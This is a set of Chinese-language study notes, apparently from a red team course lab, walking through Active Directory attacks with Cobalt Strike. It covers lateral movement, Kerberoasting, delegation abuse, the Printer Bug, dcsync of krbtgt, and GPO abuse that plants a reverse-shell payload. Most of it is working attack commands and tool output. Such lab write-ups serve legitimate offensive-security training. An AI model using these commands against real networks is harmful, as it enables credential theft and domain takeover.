# Lateral Movement

在Cobalt Strike里，提供了三种方法进行横向移动

## ```jump```命令

用法：```jump [method] [target] [listener]```

```
beacon> jump

Beacon Remote Exploits
======================

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM
```

## ```remote-exec```命令

用法：```remote-exec [method] [target] [command]```

```
beacon> remote-exec

Beacon Remote Execute Methods
=============================

    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI
```


## ```powershell```和```execute-assembly```等Cobalt Strike内置的命令


通过列举C盘目录验证是否横向成功
```
ls \\srv-1\c$
```


# PowerShell Remoting

查询靶机架构
```
beacon> remote-exec winrm srv-1 (Get-WmiObject Win32_OperatingSystem).OSArchitecture
64-bit
```

```winrm```32位横向使用


```winrm64```64位横向使用



推荐使用 SMB 协议横向。SMB 协议在 Windows 环境中广泛使用，因此横向的时候可以和smb本身的流量融合在一起。
```
beacon> jump winrm64 srv-1 smb
[+] established link to child beacon: 10.10.17.25
```


WinRM返回的是一个高完整性的beacon，可以和远程计算机建立交互式的shell


# PsExec

psexec和psexec64是唯一执行```jump```命令后可以自动执行进程迁移的方法（默认为rundll32.exe），这样做是为了自动从磁盘中删除上传的服务二进制文件。

```
beacon> jump psexec64 srv-1 smb
Started service dd80980 on srv-1
[+] established link to child beacon: 10.10.17.25
```


# Windows Management Instrumentation (WMI)

WMI 不是jump命令的一部分，但它是remote-exec命令的一部分

```
beacon> cd \\srv-1\ADMIN$
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
Started process 536 on srv-1
```

上面命令执行完以后，该进程已经在srv-1运行，需要用```link```命令连接

```
beacon> link srv-1
[+] established link to child beacon: 10.10.17.25
```

# The Curious Case of CoInitializeSecurity

CoInitializeSecurity的特殊案例

Beacon对WMI的内部实现使用一个[Beacon Object File](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm)，使用[beacon_inline_execute](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_inline_execute) Aggressor函数执行。当BOF被执行时，[CoInitializeSecurity](https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializesecurity) COM对象可以被调用，它被用来为当前进程设置安全上下文。根据微软的文档，每个进程只能调用一次。

不幸的后果是，如果你让CoInitializeSecurity在 "用户A "的上下文中被调用，那么未来的BOF可能无法在Beacon进程的生命周期中继承一个不同的安全上下文（"用户B"）。

这方面的一个例子是这样的。

```
beacon> make_token DEV\jking Purpl3Drag0n
[+] Impersonated DEV\bfarmer

beacon> remote-exec wmi srv-2 calc
CoInitializeSecurity already called. Thread token (if there is one) may not get used
[-] Could not connect to srv-2: 5
```


我们知道```jking```是SRV-2上的本地管理员，但是由于```CoInitializeSecurity```已经被调用（可能是在bfarmer的上下文中），WMI执行失败，显示拒绝访问。

作为一种变通方法，你的WMI执行需要来自不同的进程。这可以通过 ```spawn``` 和 ```spawnas``` 等命令来实现，甚至可以使用```execute-assembly```执行```SharpWMI```工具

```
beacon> remote-exec wmi srv-2 calc
CoInitializeSecurity already called. Thread token (if there is one) may not get used
[-] Could not connect to srv-2: 5

beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Debug\SharpWMI.exe action=exec computername=srv-2 command="C:\Windows\System32\calc.exe"

[*] Host                           : srv-2
[*] Command                        : C:\Windows\System32\calc.exe
[*] Creation of process returned   : 0
[*] Process ID                     : 1312
```


# DCOM

Beacon 没有通过Distributed Component Object Model (DCOM) 进行交互的内置功能，因此必须使用诸如[Invoke-DCOM](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)之类的外部工具。我们将在后面的模块中看到如何将其集成到jump命令中

```
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
beacon> powershell Invoke-DCOM -ComputerName srv-1 -Method MMC20.Application -Command C:\Windows\beacon-smb.exe
Completed

beacon> link srv-1
[+] established link to child beacon: 10.10.17.25
```


# Kerberos

kerberos验证流程

![alt Kerberos](https://rto-assets.s3.eu-west-2.amazonaws.com/kerberos/overview.png?width=1920)


# Kerberoasting

请求SPN

## 请求所有SPN

1. Rubeus
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap

[*] Action: Kerberoasting
[*] Searching the current domain for Kerberoastable users
[*] Total kerberoastable users : 2

$krb5tgs$23$*svc_mssql$dev.cyberbotic.io$MSSQLSvc/srv-1.dev.cyberbotic.io:1433*$[...hash...]
$krb5tgs$23$*svc_honey$dev.cyberbotic.io$HoneySvc/fake.dev.cyberbotic.io*$[...hash...]
```

2. ADSearch.exe
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 2
    [+] cn : krbtgt
    [+] cn : MS SQL Service
    [+] cn : Honey Service
```


3. BloodHound
```
MATCH (u:User {hasspn:true}) RETURN u
```

显示到达存在这些用户SPN的计算机的攻击路径
```
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
```

## 请求单个用户的SPN，使用参数/user

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:svc_mssql /nowrap

[*] Action: Kerberoasting

[*] Target User            : svc_mssql
[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1

[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MS SQL Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] ServicePrincipalName   : MSSQLSvc/srv-1.dev.cyberbotic.io:1433
[*] PwdLastSet             : 5/14/2021 1:28:34 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT

[*] Hash                   : $krb5tgs$23$*svc_mssql$dev.cyberbotic.io$MSSQLSvc/srv-1.dev.cyberbotic.io:1433*$[...hash...]
```

## 破解SPN的哈希

1. john
```
john --format=krb5tgs --wordlist=wordlist svc_mssql
```

2. hashcat
```
hashcat -a 0 -m 13100 svc_mssql wordlist
```


# AS-REP Roasting

关闭kerberos预认证的用户

## 查找关闭kerberos预认证的用户

1. ADSearch
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 1
    [+] cn                : Oracle Service
    [+] distinguishedname : CN=Oracle Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
    [+] samaccountname    : svc_oracle
```

2. BloodHound
```
MATCH (u:User {dontreqpreauth:true}) RETURN u
```

3. Rubeus
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:svc_oracle /nowrap

[*] Action: AS-REP roasting

[*] Target User            : svc_oracle
[*] Target Domain          : dev.cyberbotic.io

[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for AS-REP roastable users
[*] SamAccountName         : svc_oracle
[*] DistinguishedName      : CN=Oracle Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building AS-REQ (w/o preauth) for: 'dev.cyberbotic.io\svc_oracle'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$svc_oracle@dev.cyberbotic.io:F3B1A1 [...snip...] D6D049
```

## 破解

1. john
```
john --format=krb5asrep --wordlist=wordlist svc_oracle
```

2. hashcat
```
hashcat -a 0 -m 18200 svc_oracle wordlist 
```


# 非约束委派


## 搜索非约束委派计算机

1. ADSearch
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 2
    [+] samaccountname     : DC-2$
    [+] dnshostname        : dc-2.dev.cyberbotic.io
    [+] operatingsystem    : Windows Server 2016 Datacenter

    [+] samaccountname     : SRV-1$
    [+] dnshostname        : srv-1.dev.cyberbotic.io
    [+] operatingsystem    : Windows Server 2016 Datacenter
```

2.  BloodHound
```
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```


## 监听TGT

DC本身总是设置为非约束委派

无约束委托的一个有趣方面是，无论用户正在访问哪个服务，它都会缓存用户的 TGT。

如果管理员访问使用 Kerberos 的计算机上的文件共享或任何其他服务，他们的 TGT 将被缓存

在普通机器上，比如我们现在```srv-1```这台机器上，如果我们通过非约束委派获得了这台机器的权限，就可以在机器的内存中寻找TGT，并且利用其来模拟用户

使用Rubeus监听所有新生成的TGT
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:nlamb /interval:10

[*] Action: TGT Monitoring
[*] Target user     : nlamb
[*] Monitoring every 10 seconds for new TGTs
```

此时如果我们访问```WKSTN-2```，并运行命令```dir \\srv-1\c$```，上面的监听就会产生nlamb的TGT

```
[*] 3/9/2021 11:33:52 AM UTC - Found new TGT:

  User                  :  nlamb@DEV.CYBERBOTIC.IO
  StartTime             :  3/9/2021 11:32:10 AM
  EndTime               :  3/9/2021 9:32:10 PM
  RenewTill             :  1/1/1970 12:00:00 AM
  Flags                 :  name_canonicalize, pre_authent, forwarded, forwardable
  Base64EncodedTicket   :

    doIFZz [...snip...] 5JTw==


[*] Ticket cache size: 1
```


将 base64 解码后的字符串写入.kirbi攻击机器上的文件，创建一个登录session，使用ptt（pass the ticket）访问DC
```
beacon> make_token DEV\nlamb FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\nlamb.kirbi
beacon> ls \\dc-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/23/2021 16:49:25   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/21/2021 11:20:15   Shares
          dir     02/19/2021 11:39:02   System Volume Information
          dir     02/17/2021 18:50:37   Users
          dir     02/19/2021 13:26:27   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 512mb    fil     03/09/2021 10:26:16   pagefile.sys
```



用powershell根据tgt制作ticket
```
[IO.File]::WriteAllBytes("绝对路径\TGS\ticket.kirbi", [Convert]::FromBase64String("得到的base64"))
```

# The "Printer Bug"

如果一台机器配置了非约束委派（比如srv-1），可以利用Printer Bug强制任何机器（包括DC）向这台机器进行身份验证，从而使得srv-1获得DC的tgt

方法步骤：

1. 在srv-1上开启监听
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:DC-2$ /interval:10 /nowrap

[*] Action: TGT Monitoring
[*] Target user     : DC-2$
[*] Monitoring every 10 seconds for new TGTs
```

2. 在WKSTN-1使用SpoolSample.exe强制dc-2这台机器向srv-1进行身份验证
```
beacon> execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe dc-2 srv-1

[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
```

参数解释：
```
dc-2 is the "target" server

srv-1 is the "capture" server

```

3. srv-1的监听会收到dc-2的TGT
```
[*] 3/9/2021 12:00:07 PM UTC - Found new TGT:

  User                  :  DC-2$@DEV.CYBERBOTIC.IO
  StartTime             :  3/9/2021 10:27:15 AM
  EndTime               :  3/9/2021 8:27:13 PM
  RenewTill             :  1/1/1970 12:00:00 AM
  Flags                 :  name_canonicalize, pre_authent, forwarded, forwardable
  Base64EncodedTicket   :

    doIFLz [...snip...] MuSU8=

[*] Ticket cache size: 1
```

4. 利用dc-2的TGT伪造票据，然后再dc-2上执行dcsync

```
beacon> make_token DEV\DC-2$ FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\dc-2.kirbi

beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa
      aes128_hmac       (4096) : 473a92cc46d09d3f9984157f7dbc7822
      des_cbc_md5       (4096) : b9fefed6da865732
```

# Constrained Delegation

约束委派的机器不允许缓存其他用户的 TGT，但允许它用自己的TGT为其他用户请求TGS。

## 查找约束委派计算机

1. ADSearch
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 1
[
  {
    "cn": "SRV-2",
    "dnshostname": "srv-2.dev.cyberbotic.io",
    "samaccountname": "SRV-2$",
    "msds-allowedtodelegateto": [
      "eventlog/dc-2.dev.cyberbotic.io/dev.cyberbotic.io",
      "eventlog/dc-2.dev.cyberbotic.io",
      "eventlog/DC-2",
      "eventlog/dc-2.dev.cyberbotic.io/DEV",
      "eventlog/DC-2/DEV",
      "cifs/wkstn-2.dev.cyberbotic.io",
      "cifs/WKSTN-2"
    ]
  }
]
```

2. BloodHound

```
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
```

注意，约束委派可以是机器账号和用户账号，确保搜索两者。


## 执行委托


1. Rubeus

```
beacon> run hostname
srv-2

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
 --------------------------------------------------------------------------------------------------------------- 
 | LUID    | UserName                   | Service                                       | EndTime              |
 --------------------------------------------------------------------------------------------------------------- 
 | 0x3e4   | srv-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 12/5/2021 8:06:05 AM |
 | [...snip...]                                                                                                |
 --------------------------------------------------------------------------------------------------------------- 

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
```

2. mimikatz
```
beacon> mimikatz sekurlsa::ekeys

[...snip...]
       aes256_hmac       babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
       rc4_hmac_nt       6df89604703104ab6e938aee1d23541b

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:srv-2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

[*] Action: Ask TGT

[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[!] Pre-Authentication required!
[!]	AES256 Salt: DEV.CYBERBOTIC.IOhostsrv-2.dev.cyberbotic.io
[*] Using aes256_cts_hmac_sha1 hash: babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\srv-2$'
[*] Using domain controller: 10.10.17.71:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFLD [...snip...] MuSU8=
```


## 使用 TGT，执行 S4U 请求以获得 CIFS 的可用 TGS

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap
```

参数解释
```
/impersonateuser is the user we want to impersonate. nlamb is a domain admin but you want to ensure this user has local admin access to the target (WKSTN-2).
/msdsspn is the service principal name that SRV-2 is allowed to delegate to.
/user is the principal allowed to perform the delegation.
/ticket is the TGT for /user.
```

把上面命令保存成CIFS的票据

```
PS C:\> [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\cifs.kirbi", [System.Convert]::FromBase64String("doIGWD[...snip...]MuaW8="))
```

载入票据
```
beacon> make_token DEV\nlamb FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\cifs.kirbi
```

访问文件系统,这里切记使用完整的计算机名称
```
beacon> ls \\wkstn-2.dev.cyberbotic.io\c$
```

否则会报1326
```
beacon> ls \\wkstn-2\c$
[*] Tasked beacon to list files in \\wkstn-2\c$
[+] host called home, sent: 54 bytes
[-] could not open \\wkstn-2\c$\*: 1326
```

# Alternate Service Name

这个就是约束委派的一个具体例子

原文：
> The eventlog service on DC-2 is not immediately useful for lateral movement, but the service name is not validated in s4u. This means we can request a TGS for any service run by DC-2$, using /altservice flag in Rubeus.


我的理解是，一台存在约束委派的计算机，可以利用Rubeus.exe通过指定指定flag ```/altservice```去访问任意服务。在这个例子里，本来是委派了eventlog服务，现在通过命令我们可以访问cifs服务。

命令
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt

[*] Action: S4U

[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Using aes256-cts-hmac-sha1 hash: 952891c9933c675cbbc2186f10e934ddd85ab3abc3f4d2fc2f7e74fcdd01239d
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\srv-2$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFLD [...snip...] MuSU8=

[*] Action: S4U

[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building S4U2self request for: 'SRV-2$@DEV.CYBERBOTIC.IO'
[+] Sequence number is: 1421721239
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'SRV-2$@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      doIFfj [...snip...] WLTIk

[*] Impersonating user 'Administrator' to target SPN 'eventlog/dc-2.dev.cyberbotic.io'
[*]   Final tickets will be for the alternate services 'cifs'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building S4U2proxy request for service: 'eventlog/dc-2.dev.cyberbotic.io'
[+] Sequence number is: 1070349348
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/dc-2.dev.cyberbotic.io':

      doIGvD [...snip...] ljLmlv

[+] Ticket successfully imported!
```

参数解释：
/msdsspn ： 就是原来委派的一个服务，这里是```eventlog/dc-2.dev.cyberbotic.io```
/altservice : 这里换成了委派的另一个服务```cifs```，这样就可以访问dc-2的文件系统了


现在可以访问```dc-2```的文件系统
```
beacon> ls \\dc-2.dev.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot

```


# S4U2self Abuse

前提：拥有计算机的 RC4、AES256 或 TGT

滥用 S4U2self extension - 如果我们拥有域计算机的 RC4、AES256 或 TGT，则可以访问域计算机

我理解跟上面的原理是一样的，这里是使用了一个```Asn1Editor```工具把原本是```WKSTN-2$```的服务改成了```cifs/wkstn-2.dev.cyberbotic.io```，然后就可以访问wkstn-2.dev.cyberbotic.io的文件服务（cifs）

修改前：
```
C:\Tools\Rubeus\Rubeus\bin\Debug>Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi

[*] Action: Describe Ticket

  ServiceName              :  WKSTN-2$
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  nlamb
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  2/28/2022 7:30:02 PM
  EndTime                  :  3/1/2022 5:19:32 AM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  Vo7A9M7bwo7MvjKEkbmvaWcEn+RSeSU2RbsL42kT4p0=
```

修改后(注意ServiceName的值)：
```
C:\Tools\Rubeus\Rubeus\bin\Debug>Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi

[*] Action: Describe Ticket

  ServiceName              :  cifs/wkstn-2.dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  nlamb
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  2/28/2022 7:30:02 PM
  EndTime                  :  3/1/2022 5:19:32 AM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  Vo7A9M7bwo7MvjKEkbmvaWcEn+RSeSU2RbsL42kT4p0=
```

访问文件服务：
```
beacon> getuid
[*] You are DEV\bfarmer

beacon> make_token DEV\nlamb FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi

beacon> ls \\wkstn-2.dev.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 14:35:19   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot

```

下面是微软官方关于 S4U2self 和 S4U2proxy 工作过程的示意图:

![img](https://img.4hou.com/uploads/20190626/1561541368924891.png)


# Linux Credential Cache

提取域内linux机器的凭据

ccache files存储在```/tmp```目录下，注意它们都以```krb5cc```开头
```
svc_oracle@nix-1:~$ ls -l /tmp/
total 20
-rw------- 1 jking      domain users 1342 Mar  9 15:21 krb5cc_1394201122_MerMmG
-rw------- 1 svc_oracle domain users 1341 Mar  9 15:33 krb5cc_1394201127_NkktoD
```

需要root权限才能下载上面的文件，如果没有root权限，先提权

下载到本地以后，使用 Impacket把上面的文件转成kirbi格式
```
root@kali:~# impacket-ticketConverter krb5cc_1394201122_MerMmG jking.kirbi
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] converting ccache to kirbi...
[+] done
```


Cobalt Strike也有一个转kirbi的命令，但是在这个例子里，好像不能识别
```
beacon> kerberos_ccache_use C:\Users\Administrator\Desktop\krb5cc_1394201122_MerMmG
[-] Could not extract ticket from C:\Users\Administrator\Desktop\krb5cc_1394201122_MerMmG
```


ptt,访问srv-2
```
beacon> make_token DEV\jking FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\jking.kirbi

beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot

```

# GPO

# Pivot Listeners

其实这里就是监听，前面一直都是正向连接shell，这里是反向连接shell，从靶机到CS，因为GPO作用的时间可能不可控，当命令生效时马上反向连接到CS，在这个场景下reverse shell是比较好的策略。

CS新建一个rev shell

![alt rev](https://rto-assets.s3.eu-west-2.amazonaws.com/pivot-listener/new-pivot-listener.png?width=1920)

注意监听的端口是否在靶机上运行出站


使用```netsh```命令允许防火墙让4444端口出站
```
netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444
```

删除上面的出站规则
```
netsh advfirewall firewall delete rule name="Allow 4444" protocol=TCP localport=4444
```

# Remote Server Administration Tools (RSAT)

RSAT(Remote Server Administration Tools)是 是 Microsoft 提供的一个管理组件，期中GroupPolicy 模块具有多个可用于管理 GPO 的 PowerShell cmdlet，包括

- New-GPO：创建一个新的空 GPO。
- New-GPLink：将 GPO 链接到站点、域或 OU。
- Set-GPPrefRegistryValue：在计算机或用户配置下配置注册表首选项。
- Set-GPRegistryValue：在计算机或用户配置下配置一个或多个基于注册表的策略设置。
- Get-GPOReport：生成 XML 或 HTML 格式的报告。


检查是否安装了GroupPolicy 模块
```
Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
```

安装GroupPolicy 模块，需要本地管理员权限
```
Install-WindowsFeature –Name GPM
```

创建一个空的GPO，并且链接到指定的OU上
```
beacon> getuid
[*] You are DEV\jking

beacon> powershell New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"

GpoId       : d9de5634-cc47-45b5-ae52-e7370e4a4d22
DisplayName : Evil GPO
Enabled     : True
Enforced    : False
Target      : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Order       : 4
```

查找靶机可写入文件夹
```
beacon> powershell Find-DomainShare -CheckShareAccess

Name           Type Remark              ComputerName
----           ---- ------              ------------
software          0                     dc-2.dev.cyberbotic.io
```


把rev shell上传到靶机
```
beacon> cd \\dc-2\software
beacon> upload C:\Payloads\pivot.exe
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 281kb    fil     03/10/2021 13:54:10   pivot.exe
```



写入GPO内容，执行我们上面上传的pivot.exe
```
beacon> powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\pivot.exe" -Type ExpandString

DisplayName      : Evil GPO
DomainName       : dev.cyberbotic.io
Owner            : DEV\jking
Id               : d9de5634-cc47-45b5-ae52-e7370e4a4d22
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 5/26/2021 2:35:02 PM
ModificationTime : 5/26/2021 2:42:08 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 1, SysVol Version: 1
WmiFilter        : 
```

新写入的GPO可能要隔几个小时才会被刷新触发，需要马上触发执行下面命令(访问 WKSTN-2 控制台)
```
gpupdate /target:computer /force
```

# SharpGPOAbuse

[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)这个工具不可以创建GPO，但是可以编辑现有的GPO

下面命令编辑一条登录即可触发的GPO，并且添加了一个即时执行的定时任务

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Debug\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"

[+] Domain = dev.cyberbotic.io
[+] Domain Controller = dc-2.dev.cyberbotic.io
[+] Distinguished Name = CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
[+] GUID of "PowerShell Logging" is: {AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}
[+] Creating file \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```

上面命令执行完成以后，会收到很多rev shell(但是看视频演示还是要上靶机强制刷新GPO)

![alt GPOAbuse](https://rto-assets.s3.eu-west-2.amazonaws.com/group-policy/sharpgpoabuse.png?width=1920)



# ACL

ACL(Access Control Lists,自由控制列表)

下面命令返回对jadams具有GenericAll、WriteProperty或WriteDacl的主体

```
beacon> powershell Get-DomainObjectAcl -Identity jadams | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select SecurityIdentifier, ActiveDirectoryRights | fl

```


列举ACL对那些OU有GenericAll权限
```
beacon> powershell Get-DomainObjectAcl -SearchBase "CN=Users,DC=dev,DC=cyberbotic,DC=io" | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

```



# Reset User Password

重置用户密码

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> make_token DEV\jking Purpl3Drag0n
